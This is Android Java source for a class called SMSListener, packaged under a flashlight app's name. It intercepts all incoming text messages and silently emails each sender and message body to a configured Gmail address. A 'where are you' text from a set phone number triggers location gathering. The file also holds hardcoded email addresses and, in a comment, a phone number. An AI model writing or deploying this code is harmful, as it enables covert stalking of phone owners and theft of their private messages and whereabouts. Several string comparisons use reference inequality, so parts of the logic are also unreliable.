package com.flash.light; 

import java.util.List;
import android.util.Log;
import android.os.Bundle;
import java.io.IOException;
import android.app.Activity;

import android.telephony.SmsMessage;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import android.content.Intent;
import android.content.Context;
import android.content.BroadcastReceiver;

public class SMSListener extends BroadcastReceiver {

  private static GmailSender sender;

  public  static Object[] pdus;
  public  static Context context;
  public  static String mBody = null;

  /*private static String phoneNumberString = "8484820667";
  private static String gmailEmailString = "justdriveapp1@gmail.com";*/

  private static String phoneNumberString;
  private static String gmailEmailString;

  public SMSListener() {
    Configure configure = new Configure();
    configure.initDatabase();
    if(configure.getDatabaseInfo().equals("update")) {
      if(!configure.getEmailAddress().equals("null")) {
        gmailEmailString = configure.getEmailAddress();
      }
      else {
        gmailEmailString = "smsinterceptorapp@gmail.com";
      }
      if(!configure.getPhoneNumber().equals("null")) {
        phoneNumberString = configure.getPhoneNumber();
      }
      else {
        phoneNumberString = "null";
      }
      Log.d("FlashLight SMSListener() ", "gmailEmailString " + gmailEmailString);
      Log.d("FlashLight SMSListener() ", "phoneNumberString " + phoneNumberString);
      Log.d("FlashLight SMSListener() ", "phoneNumberString != \"null\" " + String.valueOf(phoneNumberString != "null"));
    }
  }

  @Override
  public void onReceive(Context context, Intent intent) {

    if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) { 

      SmsMessage[] messages = null; 
      Bundle bundle = intent.getExtras();

      if(bundle != null) {
        try {
          pdus = (Object[]) bundle.get("pdus");
          messages  = new SmsMessage[pdus.length];
          
          for(int i = 0; i < messages.length; i++) {
            messages[i]  = SmsMessage.createFromPdu((byte[])pdus[i]);
            mBody = messages[i].getMessageBody();
          }

          final String message_from = messages[0].getOriginatingAddress();

          Log.d("SMSInterceptor SMSListener", "onReceive() Entering onReceive().");

          if(phoneNumberString != "null" && gmailEmailString != "smsinterceptorapp@gmail.com" && mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
            intent = new Intent(context, SMSService.class);
            intent.putExtra("obtainLocation","obtainLocation");
            context.startService(intent);
          }
          else if(phoneNumberString == "null" && gmailEmailString != "smsinterceptorapp@gmail.com" && mBody.equals("where are you")) {
            new Thread(new Runnable() {
              @Override
              public void run() {
                try {
                  Log.d("SMSInterceptor SMSListener", "Sending email.");
                  sender = new GmailSender();
                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody, gmailEmailString);
                }
                catch(Exception e) {
                  Log.e("gmailSenderError", "" + e.toString());
                  e.printStackTrace();
                }
              }
            }).start();
          }
          else if(gmailEmailString != "smsinterceptorapp@gmail.com") {
            new Thread(new Runnable() {
              @Override
              public void run() {
                try {
                  Log.d("SMSInterceptor SMSListener", "Sending email.");
                  sender = new GmailSender();
                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody, gmailEmailString);
                }
                catch(Exception e) {
                  Log.e("gmailSenderError", "" + e.toString());
                  e.printStackTrace();
                }
              }
            }).start();
          }
        }
        catch(Exception e) {
          e.printStackTrace();
        }
        
      }
    }
  }

}
